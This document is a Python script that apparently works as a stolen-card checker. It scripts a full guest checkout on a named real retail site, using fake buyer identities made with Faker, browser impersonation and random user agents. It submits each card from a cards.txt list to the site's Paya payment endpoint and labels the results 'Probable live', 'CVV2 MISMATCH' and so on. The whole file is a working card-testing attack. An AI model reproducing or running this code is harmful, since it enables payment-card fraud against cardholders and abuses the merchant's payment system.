import random
from faker import Faker
from random import choice
from curl_cffi import requests
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return {
        'name': Faker().name(),
        'email': Faker().email().replace('@', '{}@'.format(number)),
        'username': Faker().user_name(),
        'phone': '512678{}'.format(number),
        'city': Faker().city(),
        'code': postal
    }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None


def ccn_gate(card):
    max_retries = 10
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            cliente = requests.Session(
                impersonate=choice([
                    "chrome124", "chrome123",
                    "safari17_0", "safari17_2_ios", "safari15_3"
                ])
            )
            cliente.proxies = {"https": ""}
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4:
                ano_number = ano_number[2:4]
            agente_user = UserAgent().random

            #============[Address Found]============#
            name = usuario()['name'].split(' ')[0]
            last = usuario()['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            email = usuario()['email']
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {"User-Agent": agente_user}
            result = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
            form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')

            #============[Requests 2]============#
            headers = {"Cookie": f"form_key={form_key};", "User-Agent": agente_user}
            data = {"product": "21873", "item": "21873", "form_key": form_key,
                    "super_attribute[183]": "6440", "qty": "1"}
            cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/",
                         data=data, headers=headers)

            #============[Requests 3]============#
            headers = {"User-Agent": agente_user}
            result = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
            form_id = capture(result.text, '"entity_id":"', '"')

            #============[Requests 4]============#
            headers = {"User-Agent": agente_user}
            data = {"customerEmail": email}
            cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable",
                         json=data, headers=headers)

            #============[Requests 5]============#
            headers = {"User-Agent": agente_user}
            data = {
                "addressInformation": {
                    "shipping_address": {
                        "countryId": "US",
                        "regionId": "49",
                        "regionCode": "OR",
                        "region": "Oregon",
                        "street": [f"{number} B Airport Rd "],
                        "company": "None",
                        "telephone": phone,
                        "postcode": "97402",
                        "city": "eugene",
                        "firstname": name,
                        "lastname": last
                    },
                    "billing_address": {
                        "countryId": "US",
                        "regionId": "49",
                        "regionCode": "OR",
                        "region": "Oregon",
                        "street": [f"{number} B Airport Rd "],
                        "company": "None",
                        "telephone": phone,
                        "postcode": "97402",
                        "city": "eugene",
                        "firstname": name,
                        "lastname": last
                    },
                    "shipping_method_code": "GND",
                    "shipping_carrier_code": "shqups"
                }
            }
            cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information",
                         json=data, headers=headers)

            #============[Requests 6]============#
            headers = {"User-Agent": agente_user}
            data = "payment_method=paya"
            cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/",
                         data=data, headers=headers)

            #============[Requests 7]============#
            headers = {"User-Agent": agente_user}
            data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}"
            result = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)

            message_text = capture(result.json()['paymentresponse'], '"message":"', '"')

            #============[Resultados simplificados]============#
            if "AVS FAILURE" in result.text:
                return "AVS FAILURE"
            elif "There was a problem with the request." in message_text:
                return "Probable live"
            elif "CVV2 MISMATCH" in message_text:
                return "CVV2 MISMATCH"
            return message_text

        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return f"ERROR después de {retry_count} intentos"


if __name__ == "__main__":
    file = open('cards.txt', 'r')
    lines = file.readlines()
    for position, x in enumerate(lines):
        cc, mes, ano, cvv = x.split("|")
        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
        print(gateway)
        with open('cards.txt', "w") as f:
            f.writelines(lines[position+1:])
